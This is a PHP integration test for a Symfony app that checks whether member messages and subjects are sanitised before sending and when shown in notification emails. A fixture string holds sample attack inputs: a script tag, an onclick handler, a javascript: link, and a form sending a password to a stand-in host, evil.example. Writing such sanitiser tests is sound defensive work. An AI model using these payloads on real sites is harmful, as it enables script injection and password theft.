<?php

namespace App\Tests\Form;

use App\Entity\Message;
use App\Form\MessageToMemberType;
use App\Service\Mailer;
use Doctrine\ORM\EntityManagerInterface;
use PHPUnit\Framework\Attributes\Group;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Component\Form\FormFactoryInterface;
use Symfony\Component\Mime\Email;

/**
 * Message texts and subjects are member input: purified when sent, and the mails show texts purified too (also
 * those of messages saved before).
 */
#[Group('integration')]
class MessagePurifyTest extends KernelTestCase
{
    private const string HOSTILE = '<p onclick="steal()">Hello there</p><script>alert(1)</script>'
        . '<form action="https://evil.example/"><input name="password"></form><a href="javascript:alert(1)">link</a>';

    protected function setUp(): void
    {
        self::bootKernel();
    }

    public function testTheMessageAndSubjectArePurifiedWhenSent(): void
    {
        $form = static::getContainer()->get(FormFactoryInterface::class)
            ->create(MessageToMemberType::class, null, ['csrf_protection' => false]); // as the controllers do

        $form->submit([
            'subject' => ['subject' => '<b>Hello</b> & welcome <script>x</script>'],
            'message' => self::HOSTILE,
        ]);

        /** @var Message $message */
        $message = $form->getData();
        self::assertSame('Hello & welcome ', $message->getSubject()->getSubject());
        $this->assertHarmless($message->getMessage());
        self::assertStringContainsString('Hello there', $message->getMessage());
    }

    public function testTheMailShowsAMessageSavedBeforePurified(): void
    {
        $message = static::getContainer()->get(EntityManagerInterface::class)
            ->getRepository(Message::class)->findOneBy([]);
        self::assertNotNull($message, 'the fixtures need a message');
        $message->setMessage(self::HOSTILE);

        static::getContainer()->get(Mailer::class)->sendMessageNotificationEmail(
            $message->getSender(),
            $message->getReceiver(),
            'message',
            ['message' => $message, 'subject' => 'test', 'body' => $message->getMessage()]
        );

        self::assertEmailCount(1);
        $email = self::getMailerMessage();
        self::assertInstanceOf(Email::class, $email);
        $html = (string) $email->getHtmlBody();
        self::assertStringContainsString('Hello there', $html);
        $this->assertHarmless($html);
    }

    private function assertHarmless(string $html): void
    {
        self::assertStringNotContainsString('<script', $html);
        self::assertStringNotContainsString('onclick', $html);
        self::assertStringNotContainsString('<form', $html);
        self::assertStringNotContainsString('javascript:', $html);
    }
}
